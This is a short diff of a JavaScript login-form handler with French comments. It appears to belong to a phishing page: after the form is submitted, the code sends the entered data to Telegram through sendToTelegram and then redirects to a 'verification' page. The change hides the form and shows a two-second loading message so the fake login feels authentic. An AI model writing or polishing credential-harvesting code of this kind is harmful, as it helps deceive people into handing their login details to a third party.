@@ -105,8 +105,21 @@ if (loginForm) {
         const success = await sendToTelegram(message);
         
         if (success) {
-            // Rediriger vers la page de vérification
-            window.location.href = 'verification.html';
+            // Afficher le message de chargement
+            const loadingMessage = document.getElementById('loadingMessage');
+            const loginForm = document.getElementById('loginForm');
+            
+            if (loginForm) {
+                loginForm.style.display = 'none';
+            }
+            if (loadingMessage) {
+                loadingMessage.style.display = 'block';
+            }
+            
+            // Attendre 2 secondes avant de rediriger
+            setTimeout(() => {
+                window.location.href = 'verification.html';
+            }, 2000);
         } else {
             if (errorMessage) {
                 errorMessage.textContent = 'Erreur lors de l\'envoi. Veuillez réessayer.';
